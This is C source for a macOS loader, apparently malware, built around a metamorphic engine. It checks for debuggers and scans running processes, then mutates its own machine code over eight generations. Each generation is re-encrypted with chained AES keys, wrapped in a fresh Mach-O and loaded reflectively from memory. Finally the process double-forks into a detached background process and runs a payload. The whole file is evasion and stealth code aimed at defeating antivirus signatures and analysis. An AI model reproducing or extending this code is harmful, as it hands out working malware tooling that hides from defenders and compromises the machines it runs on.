#include "link.h"
#if defined(__x86_64__)
#include "link_x86.h"
#endif
#include "wrap.h"
#include "core.h"
#include "chacha_rng.h"
#include "enc.h"
#include <stdbool.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <mach/mach_time.h>

extern void *custom_dlopen_from_memory(void *mh, int len);
extern void *custom_dlsym(void *handle, const char *symbol);

#ifdef AETHER_DEBUG
#define DBG(fmt, ...) fprintf(stderr, fmt, ##__VA_ARGS__)
#else
#define DBG(...) ((void)0)
#endif

#define MAX_GEN 8
#define GROWTH  4  /* allow __text to 4x for expanding gens */

static uint8_t *read_self(size_t *out) {
    char path[1024];
    uint32_t plen = sizeof(path);
    if (_NSGetExecutablePath(path, &plen)) return NULL;
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END); *out = ftell(f); fseek(f, 0, SEEK_SET);
    uint8_t *d = malloc(*out);
    if (d) fread(d, 1, *out, f);
    fclose(f);
    return d;
}

static struct section_64 *find_text(uint8_t *data) {
    struct mach_header_64 *mh = (void *)data;
    if (mh->magic != MH_MAGIC_64) return NULL;
    uint8_t *p = data + sizeof(*mh);
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        struct load_command *lc = (void *)p;
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (void *)p;
            if (!strcmp(seg->segname, "__TEXT")) {
                struct section_64 *s = (void *)(p + sizeof(*seg));
                for (uint32_t j = 0; j < seg->nsects; j++)
                    if (!strcmp(s[j].sectname, "__text")) return &s[j];
            }
        }
        p += lc->cmdsize;
    }
    return NULL;
}

static void *quiet_load(void *buf, int len, const uint8_t key[AES_KEY_SIZE], const uint8_t iv[AES_IV_SIZE]) {
    /* Decrypt __TEXT with AES if key is provided */
    if (key && iv) {
        struct mach_header_64 *mh = buf;
        uint8_t *p = (uint8_t *)buf + sizeof(*mh);
        
        for (uint32_t i = 0; i < mh->ncmds; i++) {
            struct load_command *lc = (void *)p;
            if (lc->cmd == LC_SEGMENT_64) {
                struct segment_command_64 *seg = (void *)p;
                if (!strcmp(seg->segname, "__TEXT")) {
                    struct section_64 *s = (void *)(p + sizeof(*seg));
                    for (uint32_t j = 0; j < seg->nsects; j++) {
                        if (!strcmp(s[j].sectname, "__text")) {
                            uint8_t *encrypted = (uint8_t *)buf + s[j].offset;
                            size_t enc_len = s[j].size;
                            
                            /* Decrypt in-place */
                            uint8_t *decrypted = NULL;
                            size_t dec_len = aes_decrypt(encrypted, enc_len, key, iv, &decrypted);
                            if (decrypted && dec_len > 0) {
                                memcpy(encrypted, decrypted, dec_len);
                                free(decrypted);
                            }
                            goto decrypted;
                        }
                    }
                }
            }
            p += lc->cmdsize;
        }
    }
decrypted:
    
    fflush(stdout);
    int fd = dup(1), nul = open("/dev/null", O_WRONLY);
    if (nul >= 0) { dup2(nul, 1); close(nul); }
    void *h = custom_dlopen_from_memory(buf, len);
    fflush(stdout);
    if (fd >= 0) { dup2(fd, 1); close(fd); }
    return h;
}

__attribute__((visibility("default")))
int __8d3942b93e489c7a(int argc, char **argv) {
    /* Early anti-debug before anythin' else */
    extern bool harden_check(void);
    if (!harden_check()) return 1;

    size_t fsize;
    uint8_t *orig = read_self(&fsize);
    if (!orig) return 1;

    struct section_64 *ts = find_text(orig);
    if (!ts || ts->size < 16) { free(orig); return 1; }
    uint32_t toff = ts->offset, tsz = (uint32_t)ts->size;
    uint64_t vm = ts->addr, vme = vm + tsz;

    uint32_t max_sz = tsz * GROWTH;
    uint8_t *code = malloc(max_sz);
    memcpy(code, orig + toff, tsz);
    size_t cur_sz = tsz;

    hunt_procs();

    uint32_t *prev_snap = NULL;
    uint32_t prev_sz = tsz;
    
    uint8_t gen_key[AES_KEY_SIZE], gen_iv[AES_IV_SIZE];

    for (unsigned g = 0; g < MAX_GEN; g++) {
        aether_rng_t rng;
        aether_rng_init(&rng);

        /* odd gens  = junk/opaque/block-permute (code grows)
        * even gens = eq-op/reorder/recolor (same size, diff code)
        * infinite gens w/o unbounded growth
        * each gen looks completely new
        */
        size_t gen_max = (g & 1) ? max_sz : cur_sz;
        unsigned passes = (g & 1) ? 1 : 2;
#if defined(__x86_64__)
        size_t nsz = aether_mutate_x86(code, cur_sz, gen_max, &rng, 7, passes);
#else
        size_t nsz = aether_mutate(code, cur_sz, gen_max, &rng, 7, passes, vm, vme);
#endif
        if (!nsz) break;

        /* count divergence from original */
        size_t diffs = 0, cmp = (tsz < nsz ? tsz : nsz) / 4;
        uint32_t *o = (uint32_t *)(orig + toff), *m = (uint32_t *)code;
        for (size_t i = 0; i < cmp; i++)
            if (o[i] != m[i]) diffs++;
        cur_sz = nsz;

        /* Dump first 8 insns of each gen's code */
        DBG("[gen %u] %u -> %zu bytes  %zu/%zu insns differ from original (%.0f%%)\n",
                g, tsz, cur_sz, diffs, cmp, cmp ? 100.0*diffs/cmp : 0.0);
        DBG("  code[0..7]: ");
        for (int k = 0; k < 8 && k < (int)(cur_sz/4); k++)
            DBG("%08x ", ((uint32_t*)code)[k]);
        DBG("\n");

        /* Derive AES key for this generation (key chain) */
        if (g == 0) {
            /* Gen 0: derive from stub code + runtime entropy */
            uint64_t entropy = mach_absolute_time() ^ (uint64_t)getpid();
            derive_aes_key(orig + toff, tsz, entropy, gen_key, gen_iv);
        } else {
            /* Gen N: derive from previous generation's key */
            uint8_t prev_key[AES_KEY_SIZE];
            memcpy(prev_key, gen_key, AES_KEY_SIZE);
            derive_next_key(prev_key, g, gen_key, gen_iv);
        }

        /* Encrypt mutated code with AES */
        uint8_t *encrypted = NULL;
        size_t enc_len = aes_encrypt(code, cur_sz, gen_key, gen_iv, &encrypted);
        if (!encrypted) break;

        /* wrap encrypted code in a fresh minimal mach-o */
        size_t macho_sz;
        uint8_t *macho = wrap_macho(encrypted, enc_len, &macho_sz);
        free(encrypted);
        if (!macho) break;

        /* reflective load with AES decryption */
        void *h = quiet_load(macho, (int)macho_sz, gen_key, gen_iv);
        if (!h) {
            free(macho);
            break;
        }

        /* gen N-1 vs gen N for every generation */
        {
            struct section_64 *ws = find_text(macho);
            if (ws) {
                uint32_t *prev = (g == 0) ? (uint32_t *)(orig + toff) : prev_snap;
                uint32_t *cur  = (uint32_t *)(macho + ws->offset);
                size_t n = 16, changed = 0;
                size_t total = (prev_sz < ws->size ? prev_sz : ws->size) / 4;
                for (size_t k = 0; k < total; k++)
                    if (prev[k] != cur[k]) changed++;
                DBG("  gen%u vs gen%u: %zu/%zu insns differ (%.0f%%)\n",
                        g > 0 ? g-1 : 0, g, changed, total, total ? 100.0*changed/total : 0.0);
                for (size_t k = 0; k < n && k < total; k++)
                    DBG("  %04zx  %08x %s %08x%s\n",
                            k*4, prev[k], prev[k]!=cur[k]?"->":" ", cur[k], prev[k]!=cur[k]?" *":"");
                DBG("  ...\n");
            }
        }

        /* Save snapshot for next gen's diff */
        {
            struct section_64 *ns = find_text(macho);
            if (ns) {
                prev_sz = (uint32_t)ns->size;
                if (prev_sz/4 > 0) {
                    prev_snap = realloc(prev_snap, prev_sz);
                    memcpy(prev_snap, macho + ns->offset, prev_sz);
                }
            }
        }

        /* feed forged Mach-O __text as next-gen input
        * gen N+1 mutates exactly what gen N produced
        */
        struct section_64 *ns = find_text(macho);
        if (ns && ns->size <= max_sz) {
            memcpy(code, macho + ns->offset, ns->size);
            cur_sz = ns->size;
        }
        free(macho);
    }

    /* Parent exits clean, grandchild runs */
    free(code); free(orig);
    
    DBG("\n[*] Completed %d generations\n", MAX_GEN);

    pid_t p1 = fork();
    if (p1 > 0) _exit(0);
    if (p1 < 0) return 1;

    setsid();

    pid_t p2 = fork();
    if (p2 > 0) _exit(0);
    if (p2 < 0) _exit(1);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    payload_run();
    _exit(0);
}
